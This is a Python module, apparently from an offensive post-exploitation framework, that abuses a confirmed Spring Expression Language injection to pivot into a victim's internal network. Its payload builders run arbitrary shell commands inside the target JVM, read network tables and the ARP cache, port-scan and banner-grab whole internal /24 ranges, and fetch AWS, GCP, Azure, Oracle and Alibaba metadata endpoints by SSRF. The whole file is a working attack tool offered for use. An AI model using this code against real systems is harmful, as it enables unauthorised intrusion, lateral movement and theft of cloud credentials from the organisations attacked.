# language: Python 3.10+, file: modules/post/ssrf_scan.py
# Post-exploitation: internal network pivot via confirmed SpEL injection.
# All port probes and banner grabs execute inside the target JVM — the attacker
# machine never touches the internal network directly.
#
# Scan pipeline:
#   1. Read target's own IPs from /proc/net/fib_trie, /proc/net/if_inet6, ip addr
#   2. Read ARP cache from /proc/net/arp for instant live-host discovery
#   3. Derive /24 CIDR blocks; combine with ARP hosts
#   4. SpEL java.net.Socket probe each host×port (concurrent)
#   5. Banner-grab open ports via SpEL Scanner read
#   6. Probe cloud metadata endpoints (AWS / GCP / Azure)

import base64
import json
import re
import ssl
import time
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.exploit_core import ExploitCoreResult


# ─── Helpers (mirrors cmd_exec pattern) ──────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _send(url: str, body: bytes, headers: dict, method: str = "POST",
          timeout: float = 10.0) -> tuple[int, str]:
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(32768).decode(errors="replace")
    except urllib.error.HTTPError as e:
        body_resp = ""
        try:
            body_resp = e.read(16384).decode(errors="replace")
        except Exception:
            pass
        return e.code, body_resp
    except Exception as e:
        return 0, str(e)


def _try_spel(base: str, path: str, expression: str, timeout: float) -> tuple[int, str]:
    body = json.dumps({"expression": expression, "data": expression}).encode()
    headers = {"Content-Type": "application/json", "User-Agent": "Java4Shell-PostEx/1.0"}
    return _send(base.rstrip("/") + path, body, headers, timeout=timeout)


# ─── Target ports to probe ────────────────────────────────────────────────────

TARGET_PORTS: list[int] = [
    8080,   # Spring Boot, Tomcat, Jenkins
    8443,   # HTTPS Java
    8081,   # JFrog Artifactory, alt-HTTP
    8082,   # Kafka REST Proxy, JFrog
    8090,   # Confluence
    9200,   # Elasticsearch
    9000,   # Spinnaker Gate, SonarQube
    7474,   # Neo4j HTTP
    5601,   # Kibana
    3306,   # MySQL
    5432,   # PostgreSQL
    6379,   # Redis
    27017,  # MongoDB
    22,     # SSH (fingerprinting)
    80,     # HTTP
    443,    # HTTPS
    8888,   # Jupyter Notebook
    4848,   # GlassFish admin
    4040,   # Spark UI
    2181,   # ZooKeeper
    9092,   # Kafka broker
    61616,  # ActiveMQ
    1099,   # Java RMI registry
]

# Cloud metadata endpoints
CLOUD_METADATA: list[tuple[str, str, dict]] = [
    (
        "AWS",
        "http://169.254.169.254/latest/meta-data/",
        {},
    ),
    (
        "GCP",
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        {"Metadata-Flavor": "Google"},
    ),
    (
        "Azure",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        {"Metadata": "true"},
    ),
    (
        "Oracle",
        "http://169.254.169.254/opc/v2/instance/",
        {"Authorization": "Bearer Oracle"},
    ),
    (
        "Alibaba",
        "http://100.100.100.200/latest/meta-data/",
        {},
    ),
]


# ─── SpEL payload builders ────────────────────────────────────────────────────

def _spel_exec_read(shell_cmd: str) -> str:
    """Execute a shell command on the target and return its stdout as a string."""
    cmd_b64 = base64.b64encode(shell_cmd.encode()).decode()
    return (
        "new java.util.function.Supplier<String>() {"
        "  public String get() {"
        "    try {"
        "      String[] cmd = {\"sh\", \"-c\","
        f"       new String(java.util.Base64.getDecoder().decode(\"{cmd_b64}\"))"
        "      };"
        "      Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();"
        "      java.util.Scanner sc = new java.util.Scanner("
        "        p.getInputStream()).useDelimiter(\"\\\\A\");"
        "      return sc.hasNext() ? sc.next() : \"\";"
        "    } catch(Exception e) { return \"ERR:\" + e.getMessage(); }"
        "  }"
        "}.get()"
    )


def _spel_socket_connect(ip: str, port: int, connect_timeout_ms: int = 2000) -> str:
    """
    Probe ip:port via java.net.Socket with a timeout.
    Returns "OPEN:<port>" on success, "CLOSED" or "ERR:..." on failure.
    """
    return (
        "new java.util.function.Supplier<String>() {"
        "  public String get() {"
        "    try {"
        f"      java.net.Socket s = new java.net.Socket();"
        f"      s.connect(new java.net.InetSocketAddress(\"{ip}\", {port}), {connect_timeout_ms});"
        "      s.close();"
        f"      return \"OPEN:{port}\";"
        "    } catch(java.net.ConnectException e) {"
        f"      return \"CLOSED:{port}\";"
        "    } catch(Exception e) {"
        f"      return \"ERR:{port}:\" + e.getMessage();"
        "    }"
        "  }"
        "}.get()"
    )


def _spel_banner_grab(ip: str, port: int, read_timeout_ms: int = 2000,
                      read_bytes: int = 512) -> str:
    """
    Connect to ip:port and read up to read_bytes of the banner.
    Returns the banner string or "ERR:...".
    """
    return (
        "new java.util.function.Supplier<String>() {"
        "  public String get() {"
        "    try {"
        f"      java.net.Socket s = new java.net.Socket();"
        f"      s.connect(new java.net.InetSocketAddress(\"{ip}\", {port}), 2000);"
        f"      s.setSoTimeout({read_timeout_ms});"
        "      java.io.InputStream is = s.getInputStream();"
        f"      byte[] buf = new byte[{read_bytes}];"
        "      int n = is.read(buf);"
        "      s.close();"
        "      if (n <= 0) return \"\";"
        "      return new String(buf, 0, n, \"UTF-8\");"
        "    } catch(Exception e) { return \"ERR:\" + e.getMessage(); }"
        "  }"
        "}.get()"
    )


def _spel_http_fetch(url: str, extra_headers: dict) -> str:
    """
    Fetch a URL from the target JVM (SSRF) and return response body (up to 4096 bytes).
    extra_headers: dict of header name → value to add to the request.
    """
    # Build the header-setting code
    header_lines = "".join(
        f" conn.setRequestProperty(\"{k}\", \"{v}\");"
        for k, v in extra_headers.items()
    )
    return (
        "new java.util.function.Supplier<String>() {"
        "  public String get() {"
        "    try {"
        f"      java.net.URL u = new java.net.URL(\"{url}\");"
        "      java.net.HttpURLConnection conn ="
        "        (java.net.HttpURLConnection) u.openConnection();"
        "      conn.setConnectTimeout(3000);"
        "      conn.setReadTimeout(3000);"
        + header_lines +
        "      conn.connect();"
        "      java.util.Scanner sc = new java.util.Scanner("
        "        conn.getInputStream()).useDelimiter(\"\\\\A\");"
        "      String body = sc.hasNext() ? sc.next() : \"\";"
        "      return body.length() > 4096 ? body.substring(0, 4096) : body;"
        "    } catch(Exception e) { return \"ERR:\" + e.getMessage(); }"
        "  }"
        "}.get()"
    )


# ─── Result ───────────────────────────────────────────────────────────────────

@dataclass
class SsrfScanResult:
    local_ips: list[str] = field(default_factory=list)
    local_cidrs: list[str] = field(default_factory=list)
    arp_hosts: list[str] = field(default_factory=list)
    open_services: dict[str, list[int]] = field(default_factory=dict)
    banners: dict[str, dict[int, str]] = field(default_factory=dict)
    cloud_metadata: dict[str, str] = field(default_factory=dict)
    total_hosts_scanned: int = 0
    total_ports_scanned: int = 0
    notes: list[str] = field(default_factory=list)
    success: bool = False
    error: Optional[str] = None


# ─── Parsing helpers ──────────────────────────────────────────────────────────

def _extract_spel_result(body: str) -> str:
    """Pull SpEL evaluation result from various response shapes."""
    for key in ("result", "value", "output", "data", "text", "message", "expression"):
        m = re.search(rf'"{key}"\s*:\s*"((?:[^"\\]|\\.)*)"', body)
        if m:
            val = m.group(1).replace("\\n", "\n").replace("\\t", "\t")
            if val.strip():
                return val
    # Bare response
    stripped = body.strip().strip('"')
    if stripped:
        return stripped
    return ""


def _parse_fib_trie(raw: str) -> list[str]:
    """
    Parse /proc/net/fib_trie output for host-local addresses.
    Lines under a /32 LOCAL entry carry the actual IP.
    Returns list of IPv4 addresses.
    """
    ips: list[str] = []
    lines = raw.splitlines()
    for i, line in enumerate(lines):
        if "LOCAL" in line and "/32" in line:
            # The IP is on the line above (the leaf key line)
            if i > 0:
                m = re.search(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", lines[i - 1])
                if m:
                    candidate = m.group(1)
                    if not candidate.startswith("127.") and candidate != "0.0.0.0":
                        ips.append(candidate)
    return list(set(ips))


def _parse_ifconfig(raw: str) -> list[str]:
    """Extract IPv4 addresses from ip addr or ifconfig output."""
    ips: list[str] = []
    for m in re.finditer(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", raw):
        ip = m.group(1)
        if not ip.startswith("127.") and ip != "0.0.0.0":
            ips.append(ip)
    return list(set(ips))


def _parse_arp(raw: str) -> list[str]:
    """
    Parse /proc/net/arp for live hosts.
    Format: IP HW_type flags HW_addr Mask Device
    Only return entries with flags != 0x0 (live entries).
    """
    hosts: list[str] = []
    for line in raw.splitlines()[1:]:  # skip header
        parts = line.split()
        if len(parts) < 6:
            continue
        ip    = parts[0]
        flags = parts[2]
        try:
            if int(flags, 16) != 0:
                if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", ip):
                    hosts.append(ip)
        except ValueError:
            pass
    return list(set(hosts))


def _ips_to_cidrs(ips: list[str]) -> list[str]:
    """Derive unique /24 CIDR blocks from a list of IPv4 addresses."""
    cidrs: set[str] = set()
    for ip in ips:
        parts = ip.split(".")
        if len(parts) == 4:
            cidrs.add(f"{parts[0]}.{parts[1]}.{parts[2]}.0/24")
    return sorted(cidrs)


def _expand_cidr24(cidr: str) -> list[str]:
    """Expand a .0/24 CIDR to all 254 host addresses (.1 through .254)."""
    prefix = cidr.rsplit(".", 1)[0]  # e.g. "192.168.1"
    return [f"{prefix}.{i}" for i in range(1, 255)]


# ─── Main function ────────────────────────────────────────────────────────────

def run_ssrf_scan(fp: FingerprintResult,
                  core: ExploitCoreResult,
                  timeout: float = 10.0,
                  verbose: bool = False) -> SsrfScanResult:
    """
    Pivot through the confirmed SpEL injection to scan the target's internal network.

    All network activity (socket probes, HTTP fetches) originates from the
    compromised JVM — the attacker machine only sends SpEL payloads over HTTP.

    Returns a SsrfScanResult with discovered hosts, open ports, banners, and
    any cloud metadata reachable from the target.
    """
    result = SsrfScanResult()

    if not core.oob_triggered:
        result.error = "OOB write not confirmed — run exploit core first."
        result.notes.append("Skipped: exploit core did not confirm OOB trigger.")
        return result

    base = fp.target_url.rstrip("/")
    endpoints = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
    primary_path = endpoints[0]["path"] if endpoints else "/"
    secondary_paths = [e["path"] for e in endpoints[1:3]]

    # Effective connect timeout for each socket probe inside the JVM
    socket_timeout_ms = max(500, int(min(timeout, 5.0) * 1000))

    def _deliver(spel_expr: str, t: Optional[float] = None) -> str:
        """Deliver a SpEL expression and return extracted result string."""
        t = t or timeout
        code, body = _try_spel(base, primary_path, spel_expr, t)
        result_str = _extract_spel_result(body)
        if result_str:
            return result_str
        for path in secondary_paths:
            code, body = _try_spel(base, path, spel_expr, t)
            result_str = _extract_spel_result(body)
            if result_str:
                return result_str
        return ""

    # ── Phase 1: Discover target's local IPs ──────────────────────────────
    if verbose:
        print("  [ssrf_scan] Reading target network interfaces …")

    all_ips: list[str] = []

    fib_raw = _deliver(_spel_exec_read("cat /proc/net/fib_trie 2>/dev/null"))
    if fib_raw and "ERR:" not in fib_raw[:5]:
        parsed = _parse_fib_trie(fib_raw)
        all_ips.extend(parsed)
        result.notes.append(f"fib_trie: found {len(parsed)} IP(s)")
    else:
        result.notes.append("fib_trie: not readable, trying ip/ifconfig.")

    if not all_ips:
        ifcfg_raw = _deliver(_spel_exec_read(
            "ip addr 2>/dev/null || ifconfig 2>/dev/null"
        ))
        if ifcfg_raw and "ERR:" not in ifcfg_raw[:5]:
            parsed = _parse_ifconfig(ifcfg_raw)
            all_ips.extend(parsed)
            result.notes.append(f"ip addr/ifconfig: found {len(parsed)} IP(s)")

    # IPv6 (extract any embedded IPv4-mapped addresses)
    if6_raw = _deliver(_spel_exec_read("cat /proc/net/if_inet6 2>/dev/null"))
    if if6_raw and "ERR:" not in if6_raw[:5]:
        result.notes.append("if_inet6: read (IPv6 addresses noted but not scanned).")

    result.local_ips = sorted(set(all_ips))
    if verbose:
        print(f"  [ssrf_scan] Target IPs: {result.local_ips}")

    # ── Phase 2: ARP cache for live hosts ─────────────────────────────────
    if verbose:
        print("  [ssrf_scan] Reading ARP cache …")

    arp_raw = _deliver(_spel_exec_read("cat /proc/net/arp 2>/dev/null"))
    arp_hosts: list[str] = []
    if arp_raw and "ERR:" not in arp_raw[:5]:
        arp_hosts = _parse_arp(arp_raw)
        result.arp_hosts = arp_hosts
        result.notes.append(f"ARP cache: {len(arp_hosts)} live host(s)")
    else:
        result.notes.append("ARP cache: not readable.")

    # ── Phase 3: Derive /24 CIDRs and build host list ─────────────────────
    result.local_cidrs = _ips_to_cidrs(result.local_ips)
    if verbose:
        print(f"  [ssrf_scan] CIDRs: {result.local_cidrs}")

    # Build the full scan list: ARP hits first (highest confidence), then CIDR expansion
    scan_hosts: list[str] = list(arp_hosts)
    for cidr in result.local_cidrs:
        for h in _expand_cidr24(cidr):
            if h not in scan_hosts:
                scan_hosts.append(h)

    # Deduplicate, preserve order
    seen: set[str] = set()
    deduped_hosts: list[str] = []
    for h in scan_hosts:
        if h not in seen:
            seen.add(h)
            deduped_hosts.append(h)
    scan_hosts = deduped_hosts

    result.total_hosts_scanned = len(scan_hosts)
    result.total_ports_scanned = len(scan_hosts) * len(TARGET_PORTS)
    if verbose:
        print(f"  [ssrf_scan] Scanning {len(scan_hosts)} hosts × {len(TARGET_PORTS)} ports …")

    if not scan_hosts:
        result.error = "No hosts to scan — could not determine target's network."
        return result

    # ── Phase 4: Concurrent port scan via SpEL socket probes ──────────────
    open_services: dict[str, list[int]] = {}

    def _probe_port(host: str, port: int) -> tuple[str, int, bool]:
        """Probe a single host:port. Returns (host, port, is_open)."""
        spel = _spel_socket_connect(host, port, socket_timeout_ms)
        raw = _deliver(spel, t=min(timeout, socket_timeout_ms / 1000.0 + 3.0))
        if raw.startswith(f"OPEN:{port}"):
            return host, port, True
        return host, port, False

    # Use threads; each probe is network I/O on the attacker side (waiting for SpEL resp)
    # Parallelism capped at 20 to avoid overwhelming the target's thread pool
    max_workers = min(20, len(scan_hosts) * len(TARGET_PORTS))

    # For ARP-known hosts, scan all ports. For CIDR-only hosts, do a quick check
    # on a subset first to avoid thousands of requests on a /24 with mostly dead hosts.
    # Strategy: scan ARP hosts fully, then for CIDR hosts do ping-equivalent first
    # (port 80/8080 to confirm alive), then full scan only on responsive ones.
    arp_set = set(arp_hosts)

    quick_ports = [80, 8080, 22, 443]  # quick-alive check for CIDR-only hosts
    alive_cidr_hosts: set[str] = set()

    futures_map: dict = {}
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        # Queue ARP hosts: full port scan immediately
        for host in [h for h in scan_hosts if h in arp_set]:
            for port in TARGET_PORTS:
                f = ex.submit(_probe_port, host, port)
                futures_map[f] = (host, port)

        # Queue CIDR-only hosts: quick-alive check first
        cidr_only = [h for h in scan_hosts if h not in arp_set]
        for host in cidr_only:
            for port in quick_ports:
                f = ex.submit(_probe_port, host, port)
                futures_map[f] = (host, port)

        for f in as_completed(futures_map):
            host, port, is_open = f.result()
            if is_open:
                open_services.setdefault(host, []).append(port)
                # Mark CIDR-only hosts that responded
                if host not in arp_set:
                    alive_cidr_hosts.add(host)

    # Full scan on CIDR-only hosts that answered the quick check
    if alive_cidr_hosts:
        full_futures: dict = {}
        remaining_ports = [p for p in TARGET_PORTS if p not in quick_ports]
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            for host in alive_cidr_hosts:
                for port in remaining_ports:
                    f = ex.submit(_probe_port, host, port)
                    full_futures[f] = (host, port)
            for f in as_completed(full_futures):
                host, port, is_open = f.result()
                if is_open:
                    open_services.setdefault(host, []).append(port)

    result.open_services = {h: sorted(ports) for h, ports in open_services.items()}
    total_open = sum(len(v) for v in result.open_services.values())
    result.notes.append(
        f"Port scan complete: {total_open} open port(s) across "
        f"{len(result.open_services)} host(s)."
    )
    if verbose:
        print(f"  [ssrf_scan] {total_open} open port(s) on {len(result.open_services)} host(s).")

    # ── Phase 5: Banner grab open ports ───────────────────────────────────
    if verbose:
        print("  [ssrf_scan] Grabbing service banners …")

    banners: dict[str, dict[int, str]] = {}

    # Grab banners sequentially to avoid overload; open port count is small
    for host, ports in result.open_services.items():
        for port in ports:
            spel = _spel_banner_grab(host, port,
                                     read_timeout_ms=2000,
                                     read_bytes=512)
            raw = _deliver(spel, t=min(timeout, 6.0))
            banner = raw.strip()
            if banner and not banner.startswith("ERR:"):
                banners.setdefault(host, {})[port] = banner[:256]
            elif not banner:
                # Some services (HTTP) need us to send data first; try HTTP GET
                http_spel = _spel_http_fetch(
                    f"http://{host}:{port}/",
                    {}
                )
                http_raw = _deliver(http_spel, t=min(timeout, 6.0))
                if http_raw and not http_raw.startswith("ERR:"):
                    banners.setdefault(host, {})[port] = http_raw[:256]

    result.banners = banners
    result.notes.append(
        f"Banner grab: {sum(len(v) for v in banners.values())} banner(s) collected."
    )

    # ── Phase 6: Cloud metadata SSRF ──────────────────────────────────────
    if verbose:
        print("  [ssrf_scan] Probing cloud metadata endpoints …")

    for provider, url, headers in CLOUD_METADATA:
        spel = _spel_http_fetch(url, headers)
        raw = _deliver(spel, t=min(timeout, 6.0))
        if raw and not raw.startswith("ERR:"):
            result.cloud_metadata[provider] = raw[:2048]
            result.notes.append(f"Cloud metadata reachable: {provider} ({url})")
        else:
            if verbose:
                err_snippet = raw[4:80] if raw.startswith("ERR:") else "(no response)"
                print(f"    {provider}: {err_snippet}")

    # ── Finalize ───────────────────────────────────────────────────────────
    result.success = bool(
        result.local_ips
        or result.arp_hosts
        or result.open_services
        or result.cloud_metadata
    )

    if not result.success:
        result.error = (
            "SSRF scan produced no results. SpEL expressions may not be reflected "
            "in the response body, or the network interface commands failed. "
            "Verify SpEL delivery with cmd_exec module first."
        )

    return result


# ─── Print helper ─────────────────────────────────────────────────────────────

def print_ssrf_scan(r: SsrfScanResult) -> None:
    status = "✓ SUCCESS" if r.success else "✗ FAILED"
    print(f"\n[ssrf_scan] {status}")
    print(f"  Target IPs    : {', '.join(r.local_ips) or 'none'}")
    print(f"  Local CIDRs   : {', '.join(r.local_cidrs) or 'none'}")
    print(f"  ARP hosts     : {len(r.arp_hosts)}")
    print(f"  Hosts scanned : {r.total_hosts_scanned}")
    print(f"  Ports scanned : {r.total_ports_scanned}")

    if r.open_services:
        print("\n  Open services:")
        for host, ports in sorted(r.open_services.items()):
            port_str = ", ".join(str(p) for p in ports)
            print(f"    {host}: {port_str}")
            if host in r.banners:
                for port, banner in r.banners[host].items():
                    clean = banner.replace("\n", " ").replace("\r", "")[:100]
                    print(f"      :{port} → {clean}")
    else:
        print("  Open services : none found")

    if r.cloud_metadata:
        print("\n  Cloud metadata:")
        for provider, snippet in r.cloud_metadata.items():
            preview = snippet.replace("\n", " ")[:120]
            print(f"    [{provider}] {preview}")

    for note in r.notes:
        print(f"  [*] {note}")
    if r.error:
        print(f"  [!] {r.error}")
